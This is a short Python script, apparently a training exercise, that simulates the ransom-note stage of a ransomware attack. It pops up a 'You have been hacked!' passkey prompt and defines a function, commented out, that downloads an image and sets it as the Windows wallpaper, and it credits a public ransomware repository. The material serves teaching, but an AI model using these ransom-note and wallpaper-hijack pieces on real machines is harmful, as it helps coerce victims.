#!/usr/bin/python3


# Script Name: Add a Note
# Author: Shay Crane
# Date of last revision: 10/12/2022
# Purpose: an exercise to simulate a ransomware attack: 
#          - this example attack workflow begins with file 'encryptFile.py'

# NOTE: script must be reviewed and tested for bugs in a sandboxed environment before use.


# I referred to the following source for components of this script: 
# https://github.com/ncorbuk/Python-Ransomware/blob/master/RansomWare.py


# install pyautogui library
# import ctypes
# import urllib.request
import pyautogui

# define change_wallpaper function
def change_wallpaper(plaster):
    imageUrl = 'https://www.secpod.com/blog/wp-content/uploads/2017/05/Screenshot-from-2017-05-14-23-42-20.png'
    path = f'{plaster.sysRoot}Desktop/background.jpg'
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

def leave_note():
    pyautogui.prompt('You have been hacked!\nEnter passkey to get your files back\nCancel to lose all your files forever', 'Hack Announcement Service', 'Submit Passkey')


# define ransom-note function
def ransomware_simulate():
#   change_wallpaper()
    leave_note()
    
# redefine ask_user() function (class06.py) to include more options
# and to demonstrate how it fits into the larger script
def ask_user():
    user_choice = input('pretend all the options from previous scripts are also here\n Enter 8 to simulate ransomware attack: ')
    
    if (user_choice == '8'): 
        ransomware_simulate()
    else: 
        print('You can only enter 8 to proceed. Try again.')

# Main
# invoke the ask_user function
ask_user()

# End

